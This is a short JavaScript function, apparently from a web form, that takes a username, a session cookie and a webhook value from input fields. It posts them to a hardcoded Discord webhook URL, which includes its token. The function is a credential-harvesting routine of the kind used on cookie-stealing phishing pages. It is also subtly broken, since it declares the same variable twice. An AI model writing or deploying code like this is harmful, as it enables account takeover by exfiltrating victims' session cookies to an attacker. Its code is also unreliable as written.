function submit() {
  let username = document.getElementById("username").value;
  let cookie= document.getElementById("Cookie").value;
  let webhook = document.getElementById("Webhook").value;
  
   const webhook = 
   "https://discord.com/api/webhooks/1267427698825756674/d3OaHRip1hSDeGkb5mxd3sFcX_HDSClJpXNxo7Xwlw3ITI1S8WcBIZUuvgEKi6_5Fl6n";
   
    const contents = `username: ${username}\nCookie: ${cookie}\nWebhook: ${webhook}`;
    const request = new XMLHttpRequest();
    request.open("POST", webhook);
    request.setRequestHeader('Content-type', 'application/json');
    const params = {
      contents: contents
    }
      request.send(JSON.stringify(params));
}
